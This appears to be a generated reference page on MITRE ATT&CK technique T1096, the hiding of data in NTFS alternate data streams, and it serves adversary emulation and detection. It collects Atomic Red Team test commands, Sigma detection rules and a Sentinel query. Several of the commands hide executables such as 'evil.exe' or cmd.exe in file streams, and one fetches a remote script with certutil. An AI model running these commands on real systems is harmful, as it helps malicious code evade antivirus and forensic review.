
# NTFS File Attributes

## Description

### MITRE Description

> Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Signature-based detection', 'Host forensic analysis', 'Anti-virus']
* Effective Permissions: None
* Network: None
* Permissions: None
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1096

## Potential Commands

```
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\temp:ttt
makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab
print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg
regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat
esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o

if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,c:\windows\system32\cmd.exe,>,`"#{ads_file_path}:#{ads_name}`""

if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"C:\Users\Public\Libraries\yanki\desktop.ini:#{ads_name}`""

if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:desktop.ini`""

```

## Commands Dataset

```
[{'command': 'type C:\\temp\\evil.exe > "C:\\Program Files '
             '(x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe"\n'
             'extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\n'
             'findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > '
             'c:\\ADS\\\\file.txt:procexp.exe\n'
             'certutil.exe -urlcache -split -f '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 '
             'c:\\temp:ttt\n'
             'makecab c:\\ADS\\\\autoruns.exe '
             'c:\\ADS\\\\cabtest.txt:autoruns.cab\n'
             'print /D:c:\\ADS\\\\file.txt:autoruns.exe '
             'c:\\ADS\\\\Autoruns.exe\n'
             'reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg '
             'c:\\ADS\\\\file.txt:evilreg.reg\n'
             'regedit /E c:\\ADS\\\\file.txt:regfile.reg '
             'HKEY_CURRENT_USER\\MyCustomRegKey\n'
             'expand \\\\webdav\\folder\\file.bat '
             'c:\\ADS\\\\file.txt:file.bat\n'
             'esentutl.exe /y c:\\ADS\\\\autoruns.exe /d '
             'c:\\ADS\\\\file.txt:autoruns.exe /o\n',
  'name': None,
  'source': 'atomics/T1096/T1096.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,c:\\windows\\system32\\cmd.exe,>,`"#{ads_file_path}:#{ads_name}`""\n',
  'name': None,
  'source': 'atomics/T1096/T1096.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,#{payload_path},>,`"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`""\n',
  'name': None,
  'source': 'atomics/T1096/T1096.yaml'},
 {'command': 'if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType '
             'Container)) {\n'
             '    New-Item -ItemType Directory -Force -Path '
             'C:\\Users\\Public\\Libraries\\yanki\n'
             '    }\n'
             'Start-Process -FilePath "$env:comspec" -ArgumentList '
             '"/c,type,#{payload_path},>,`"#{ads_file_path}:desktop.ini`""\n',
  'name': None,
  'source': 'atomics/T1096/T1096.yaml'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Sami Ruohonen',
                  'description': 'Detects writing data into NTFS alternate '
                                 'data streams from powershell. Needs Script '
                                 'Block Logging.',
                  'detection': {'condition': 'keyword1 and keyword2',
                                'keyword1': ['set-content'],
                                'keyword2': ['-stream']},
                  'falsepositives': ['unknown'],
                  'id': '8c521530-5169-495d-a199-0a3a881ad24e',
                  'level': 'high',
                  'logsource': {'definition': 'It is recommended to use the '
                                              'new "Script Block Logging" of '
                                              'PowerShell v5 '
                                              'https://adsecurity.org/?p=2277',
                                'product': 'windows',
                                'service': 'powershell'},
                  'references': ['http://www.powertheshell.com/ntfsstreams/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion', 'attack.t1096'],
                  'title': 'NTFS Alternate Data Stream'}},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['Kernel drivers']},
 {'data_source': ['API monitoring']},
 {'data_source': ['LMD', 'EA', ' ADS', 'Hash Compare']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['Kernel drivers']},
 {'data_source': ['API monitoring']},
 {'data_source': ['LOG-MD', 'Hash Compare']}]
```

## Potential Queries

```json
[{'name': 'NTFS File Attributes',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_path contains "fsutil.exe" '
           'and process_command_line contains "*usn*deletejournal*"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - NTFS File Attributes': {'atomic_tests': [{'auto_generated_guid': '8822c3b0-d9f9-4daf-a043-49f4602364f4',
                                                                    'description': 'Execute '
                                                                                   'from '
                                                                                   'Alternate '
                                                                                   'Streams\n'
                                                                                   '\n'
                                                                                   '[Reference '
                                                                                   '- '
                                                                                   '1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n'
                                                                                   '\n'
                                                                                   '[Reference '
                                                                                   '- '
                                                                                   '2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n',
                                                                    'executor': {'command': 'type '
                                                                                            'C:\\temp\\evil.exe '
                                                                                            '> '
                                                                                            '"C:\\Program '
                                                                                            'Files '
                                                                                            '(x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe"\n'
                                                                                            'extrac32 '
                                                                                            '#{path}\\procexp.cab '
                                                                                            '#{path}\\file.txt:procexp.exe\n'
                                                                                            'findstr '
                                                                                            '/V '
                                                                                            '/L '
                                                                                            'W3AllLov3DonaldTrump '
                                                                                            '#{path}\\procexp.exe '
                                                                                            '> '
                                                                                            '#{path}\\file.txt:procexp.exe\n'
                                                                                            'certutil.exe '
                                                                                            '-urlcache '
                                                                                            '-split '
                                                                                            '-f '
                                                                                            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 '
                                                                                            'c:\\temp:ttt\n'
                                                                                            'makecab '
                                                                                            '#{path}\\autoruns.exe '
                                                                                            '#{path}\\cabtest.txt:autoruns.cab\n'
                                                                                            'print '
                                                                                            '/D:#{path}\\file.txt:autoruns.exe '
                                                                                            '#{path}\\Autoruns.exe\n'
                                                                                            'reg '
                                                                                            'export '
                                                                                            'HKLM\\SOFTWARE\\Microsoft\\Evilreg '
                                                                                            '#{path}\\file.txt:evilreg.reg\n'
                                                                                            'regedit '
                                                                                            '/E '
                                                                                            '#{path}\\file.txt:regfile.reg '
                                                                                            'HKEY_CURRENT_USER\\MyCustomRegKey\n'
                                                                                            'expand '
                                                                                            '\\\\webdav\\folder\\file.bat '
                                                                                            '#{path}\\file.txt:file.bat\n'
                                                                                            'esentutl.exe '
                                                                                            '/y '
                                                                                            '#{path}\\autoruns.exe '
                                                                                            '/d '
                                                                                            '#{path}\\file.txt:autoruns.exe '
                                                                                            '/o\n',
                                                                                 'elevation_required': True,
                                                                                 'name': 'command_prompt'},
                                                                    'input_arguments': {'path': {'default': 'c:\\ADS\\',
                                                                                                 'description': 'Path '
                                                                                                                'of '
                                                                                                                'ADS '
                                                                                                                'file',
                                                                                                 'type': 'path'}},
                                                                    'name': 'Alternate '
                                                                            'Data '
                                                                            'Streams '
                                                                            '(ADS)',
                                                                    'supported_platforms': ['windows']},
                                                                   {'auto_generated_guid': '2ab75061-f5d5-4c1a-b666-ba2a50df5b02',
                                                                    'description': 'Storing '
                                                                                   'files '
                                                                                   'in '
                                                                                   'Alternate '
                                                                                   'Data '
                                                                                   'Stream '
                                                                                   '(ADS) '
                                                                                   'similar '
                                                                                   'to '
                                                                                   'Astaroth '
                                                                                   'malware.\n'
                                                                                   'Upon '
                                                                                   'execution '
                                                                                   'cmd '
                                                                                   'will '
                                                                                   'run '
                                                                                   'and '
                                                                                   'attempt '
                                                                                   'to '
                                                                                   'launch '
                                                                                   'desktop.ini. '
                                                                                   'No '
                                                                                   'windows '
                                                                                   'remain '
                                                                                   'open '
                                                                                   'after '
                                                                                   'the '
                                                                                   'test\n',
                                                                    'executor': {'cleanup_command': 'Remove-Item '
                                                                                                    '"#{ads_file_path}" '
                                                                                                    '-Force '
                                                                                                    '-ErrorAction '
                                                                                                    'Ignore\n',
                                                                                 'command': 'if '
                                                                                            '(!(Test-Path '
                                                                                            'C:\\Users\\Public\\Libraries\\yanki '
                                                                                            '-PathType '
                                                                                            'Container)) '
                                                                                            '{\n'
                                                                                            '    '
                                                                                            'New-Item '
                                                                                            '-ItemType '
                                                                                            'Directory '
                                                                                            '-Force '
                                                                                            '-Path '
                                                                                            'C:\\Users\\Public\\Libraries\\yanki\n'
                                                                                            '    '
                                                                                            '}\n'
                                                                                            'Start-Process '
                                                                                            '-FilePath '
                                                                                            '"$env:comspec" '
                                                                                            '-ArgumentList '
                                                                                            '"/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""\n',
                                                                                 'elevation_required': False,
                                                                                 'name': 'powershell',
                                                                                 'prereq_command': ''},
                                                                    'input_arguments': {'ads_file_path': {'default': 'C:\\Users\\Public\\Libraries\\yanki\\desktop.ini',
                                                                                                          'description': 'Path '
                                                                                                                         'of '
                                                                                                                         'file '
                                                                                                                         'to '
                                                                                                                         'create '
                                                                                                                         'an '
                                                                                                                         'ADS '
                                                                                                                         'under',
                                                                                                          'type': 'path'},
                                                                                        'ads_name': {'default': 'desktop.ini',
                                                                                                     'description': 'Name '
                                                                                                                    'of '
                                                                                                                    'ADS',
                                                                                                     'type': 'string'},
                                                                                        'payload_path': {'default': 'c:\\windows\\system32\\cmd.exe',
                                                                                                         'description': 'Path '
                                                                                                                        'of '
                                                                                                                        'file '
                                                                                                                        'to '
                                                                                                                        'hide '
                                                                                                                        'in '
                                                                                                                        'ADS',
                                                                                                         'type': 'path'}},
                                                                    'name': 'Store '
                                                                            'file '
                                                                            'in '
                                                                            'Alternate '
                                                                            'Data '
                                                                            'Stream '
                                                                            '(ADS)',
                                                                    'supported_platforms': ['windows']}],
                                                  'attack_technique': 'T1096',
                                                  'display_name': 'NTFS File '
                                                                  'Attributes'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

